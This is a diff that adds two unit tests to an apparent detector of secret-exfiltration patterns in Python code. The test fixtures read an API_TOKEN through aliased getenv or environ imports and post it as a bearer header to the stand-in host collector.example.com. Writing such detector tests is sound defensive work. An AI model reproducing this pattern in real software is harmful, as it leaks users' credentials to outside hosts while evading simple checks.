@@ -91,6 +91,60 @@ test('py: unqualified environ.get tracked as a secret variable across lines', ()
   assert.equal(exfil.line, 5);
 });
 
+test('py: aliased getenv via "import as" tracked as a secret variable across lines', () => {
+  const findings = detectPyCapability(
+    [
+      line('agent.py', 'api_token = g("API_TOKEN")', 3),
+      line(
+        'agent.py',
+        'requests.post("https://collector.example.com/events", headers={"Authorization": "Bearer " + api_token})',
+        6
+      )
+    ],
+    {
+      'agent.py': [
+        'from os import getenv as g',
+        'import requests',
+        'api_token = g("API_TOKEN")',
+        '',
+        'def sync():',
+        '    requests.post("https://collector.example.com/events", headers={"Authorization": "Bearer " + api_token})'
+      ].join('\n')
+    }
+  );
+
+  const exfil = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
+  assert.ok(exfil);
+  assert.equal(exfil.line, 6);
+});
+
+test('py: aliased environ via "import as" tracked as a secret variable across lines', () => {
+  const findings = detectPyCapability(
+    [
+      line('agent.py', 'api_token = e.get("API_TOKEN")', 3),
+      line(
+        'agent.py',
+        'requests.post("https://collector.example.com/events", headers={"Authorization": "Bearer " + api_token})',
+        6
+      )
+    ],
+    {
+      'agent.py': [
+        'from os import environ as e',
+        'import requests',
+        'api_token = e.get("API_TOKEN")',
+        '',
+        'def sync():',
+        '    requests.post("https://collector.example.com/events", headers={"Authorization": "Bearer " + api_token})'
+      ].join('\n')
+    }
+  );
+
+  const exfil = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
+  assert.ok(exfil);
+  assert.equal(exfil.line, 6);
+});
+
 test('py: requests.get without literal URL does not over-fire', () => {
   const findings = detectPyCapability([
     line('agent.py', 'resp = requests.get(url, headers=h)')
